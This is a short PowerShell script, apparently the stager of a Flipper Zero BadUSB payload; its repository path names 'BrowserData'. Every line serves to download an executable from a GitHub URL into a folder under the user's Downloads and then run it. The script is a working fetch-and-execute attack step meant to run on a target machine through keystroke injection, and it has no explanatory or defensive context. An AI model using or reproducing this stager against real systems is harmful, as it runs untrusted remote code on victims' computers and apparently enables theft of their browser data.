$url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
$dl=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'Magikarp')
if (-not (Test-Path $dl -PathType Container)) {
    New-Item -ItemType Directory -Path $dl | Out-Null
}
$dl_win64=[System.IO.Path]::Combine($dl, 'windows64.exe')
Invoke-WebRequest -Uri $url -OutFile $dl_win64
Start-Process -FilePath $dl_win64 -Wait